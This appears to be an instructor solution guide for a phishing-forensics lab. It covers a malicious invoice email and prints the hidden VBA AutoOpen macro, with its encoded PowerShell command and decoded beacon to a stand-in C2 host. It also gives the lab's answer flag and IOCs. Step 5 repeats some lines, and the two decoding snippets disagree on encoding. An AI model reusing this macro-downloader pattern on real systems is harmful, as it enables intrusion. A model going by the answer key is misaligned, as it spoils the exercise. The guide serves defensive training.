# 🎣 Instructor Solution Guide: Incident 0202 (Executive Spearphishing)

### Digital Forensics & Incident Response (DFIR) — Macro Downloader & C2 Analysis

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                                                      |
| :---------------------------------- | :--------------------------------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0202-SPEARPHISH`                                                                                                        |
| **Target Workstation**              | `FIN-WS-1002` (Internal IP: `10.0.2.19`)                                                                                     |
| **Threat Classification**           | TLP:AMBER \| Severity: **HIGH**                                                                                              |
| **Primary MITRE ATT&CK Techniques** | **T1566.001** (Spearphishing Attachment), **T1204.002** (Malicious File), **T1059.005** (VBA), **T1071.001** (Web Protocols) |
| **Spoofed Identity**                | Intuit QuickBooks Billing (`quickbooks-invoicing-update.com`)                                                                |
| **Sender Mail Relay IP**            | `203.0.113.88`                                                                                                               |
| **Weaponized Attachment**           | `Invoice_Sept2026_OVERDUE.docm`                                                                                              |
| **Command and Control (C2) Domain** | `c2-exfil-node.darknet-routing.org` (`198.51.100.99`)                                                                        |
| **Recovered Incident Flag**         | `FLAG{dmarc_fail_invoice_c2_domain_detected}`                                                                                |

On September 10, 2026, an Accounts Payable specialist at `FIN-WS-1002` received a high-priority phishing email purporting to be an overdue QuickBooks invoice. Opening the macro-enabled Word document (`.docm`) triggered an automated VBA `AutoOpen` procedure that launched an encoded PowerShell downloader. The downloader contacted an external Command-and-Control node, leaking sensitive beacon headers and establishing an outbound egress channel.

---

## 🎯 Investigation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo DFIR Console:

### Step 1: Email Header & Sender Authentication Forensics (Tab: `📨 Mail Headers & Auth`)

1. **Review Top KPI Indicators**:
   - In the header of the console, observe:
     - **DMARC Policy Alignment**: `FAIL (p=reject; disposition=none)`
     - **DKIM Signature**: `FAIL (None)`
     - **SPF Validation**: `SOFTFAIL`
     - **Extracted Attachments**: `1 File(s)`
2. **Inspect RFC 822 Email Headers**:
   - Examine the evaluated headers table:
     - **From**: `Intuit Billing Alert <billing@quickbooks-invoicing-update.com>`
     - **To**: `accountspayable@corp.internal`
     - **Subject**: `URGENT: Outstanding Overdue Invoice #INV-2026-8891`
     - **X-Originating-IP**: `203.0.113.88`
     - **Authentication-Results**: `spf=softfail (sender IP 203.0.113.88); dkim=fail; dmarc=fail`
3. **Acquire Raw Evidence**:
   - Click **📥 Download Raw RFC 822 Email (.eml)** to save the untouched forensic evidence file.
4. **Analyze Authentication Failure**:
   - Notice that `quickbooks-invoicing-update.com` is a typosquatting domain impersonating QuickBooks.
   - Because the sender IP `203.0.113.88` is not authorized by the legitimate SPF record and the cryptographic DKIM signature failed verification, DMARC evaluated to `fail`.

---

### Step 2: Attachment Carving & Macro Dissection (Tab: `📎 Attachment Carving`)

1. **Examine Document Metadata**:
   - Review the carved document metadata:
     - **Filename**: `Invoice_Sept2026_OVERDUE.docm`
     - **MIME Format**: Microsoft Word Macro-Enabled Document (`.docm`)
     - **SHA-256**: Calculated on the raw attachment bytes
2. **Acquire Carved Sample**:
   - Click **📥 Download Carved Document (.docm)** to save the weaponized document sample.
3. **Decompile the Embedded Macro**:
   - Inspect the decompiled VBA code:
     ```vb
     Sub AutoOpen()
         Dim cmd As String
         cmd = "powershell -enc SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9"
         Shell(cmd, vbHide)
     End Sub
     ```
4. **Trace Execution Mechanism**:
   - The procedure `AutoOpen()` executes immediately upon opening the document when macros are enabled.
   - `Shell(cmd, vbHide)` launches `powershell.exe` in a hidden background window (`vbHide`).
   - The argument `-enc` specifies a Base64-encoded command string.

---

### Step 3: Malware Payload Deobfuscation (Tab: `💻 Deobfuscator & Scratchpad`)

DFIR analysts can deobfuscate the command line using either the live Python console or the interactive decoder:

#### Option A: Live Python Deobfuscator
Run or modify the pre-loaded script in the embedded Python scratchpad:
```python
import base64, re

vba_code = attachments[0]['content_text']
match = re.search(r'-enc\s+([A-Za-z0-9+/=]+)', vba_code)
if match:
    b64_payload = match.group(1)
    # PowerShell -EncodedCommand uses UTF-16LE encoding
    decoded_cmd = base64.b64decode(b64_payload).decode('utf-16le')
    output = decoded_cmd
output
```

#### Option B: Manual Decoder Widget
1. Copy the Base64 string from the macro:
   `SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9`
2. Paste it into the **Manual Base64 Decoder Input** box.
3. Set **Encoding Format** to `UTF-8 / ASCII` or `UTF-16LE`.

#### Decoded PowerShell Output:
```powershell
Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key="FLAG{dmarc_fail_invoice_c2_domain_detected}"}
```

* **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
* **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`

---

### Step 4: Host DNS Telemetry & C2 Correlation (Tab: `📡 DNS C2 Correlation`)

1. **Cross-Reference Network DNS Logs**:
   - In the **DNS C2 Correlation** tab, inspect the recorded DNS queries.
2. **Trace the Victim Host Queries**:
   - Endpoint `FIN-WS-1002` (`10.0.2.19`) issued an `A` record query for `c2-exfil-node.darknet-routing.org` at `2026-09-10 08:46:15 UTC`.
   - **Resolved C2 IP**: `198.51.100.99`
   - This confirms that host `10.0.2.19` successfully reached out to the external adversary C2 infrastructure.

---

### Step 5: Case Verification & Submission (Tab: `🏁 Case Verification & IOCs`)

1. **Verify the Flag**:
   - In **Step 5: Verify Incident Flag & IOCs**, enter:
1. **Verify the Flag in the Notebook**:
   - In **Step 5: Verify Incident Flag & Threat Intel Report**, enter:
     `FLAG{dmarc_fail_invoice_c2_domain_detected}`
   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`5f458b9db61a55c7839ede55b271e293e24fee62fe40cb384d55445b9b5666ae`), ensuring no plaintext answers can be inspected in the notebook code.
   - Confirm the green success banner: `🎉 FLAG VERIFIED CORRECT!`.
   - Upon correct verification, the confirmed **Threat Intelligence Indicators (IOCs)** report unlocks below the input box.
2. **Submit to Portal**:
   - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box to claim 100 points.
   - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box in the left portal pane to claim your 100 points and register your Phishing DFIR competency.

---

## 🐍 Standalone Python Forensics Script

To extract the attachment, decompile the macro, and decode the payload programmatically:

```python
import base64
import email
from email import policy
from pathlib import Path
import re

# Load email message
eml_file = Path("data/urgent_invoice.eml")
with open(eml_file, "rb") as f:
    msg = email.message_from_binary_file(f, policy=policy.default)

print(f"[+] From: {msg.get('From')}")
print(f"[+] Authentication-Results: {msg.get('Authentication-Results')}")

# Extract attachment and find base64 payload
for part in msg.iter_attachments():
    filename = part.get_filename()
    content = part.get_payload(decode=True).decode("utf-8", errors="ignore")
    print(f"[+] Attachment found: {filename}")

    b64_match = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", content)
    if b64_match:
        raw_b64 = b64_match.group(1)
        decoded = base64.b64decode(raw_b64).decode("utf-8", errors="ignore")
        print(f"[!] Decoded PowerShell Payload:\n{decoded}")
```

---

## 📋 Indicators of Compromise (IOCs)

| IOC Type                | Value                                                              | Context                                     |
| :---------------------- | :----------------------------------------------------------------- | :------------------------------------------ |
| **Spoofed Domain**      | `quickbooks-invoicing-update.com`                                  | Phishing sender domain impersonating Intuit |
| **Originating IP**      | `203.0.113.88`                                                     | Untrusted external SMTP relay server        |
| **Malicious File**      | `Invoice_Sept2026_OVERDUE.docm`                                    | Weaponized Word macro downloader            |
| **File Hash (SHA-256)** | `e2d67b077a565a443dd4aa5905d419b457e53ef788a4dbdae330e7c5148679f2` | Known malicious invoice document            |
| **C2 Domain**           | `c2-exfil-node.darknet-routing.org`                                | HTTP beacon receiver                        |
| **C2 IPv4**             | `198.51.100.99`                                                    | External C2 listener                        |

---

## 🛡️ Remediation & Incident Response Playbook

1. **Endpoint Isolation**:
   - Immediately disconnect `FIN-WS-1002` (`10.0.2.19`) from the local subnet to contain C2 beaconing.
2. **Email Gateway Purge**:
   - Execute an Exchange / Google Workspace Compliance Search to search and destroy all emails matching Message-ID, Subject, or sender domain `quickbooks-invoicing-update.com`.
3. **Perimeter DNS & Firewall Blocking**:
   - Sinkhole `c2-exfil-node.darknet-routing.org` on corporate recursive DNS resolvers.
   - Block IP `198.51.100.99` on egress firewalls.
4. **Group Policy Hardening**:
   - Deploy Microsoft Office Group Policy Object (GPO) enforcing: **"Block macros from running in Office files from the Internet"** (`VBA Macro Notification Settings -> Disable all without notification`).
   - Enforce strict DMARC rejection policies (`p=reject`) on inbound email inspection gateways.
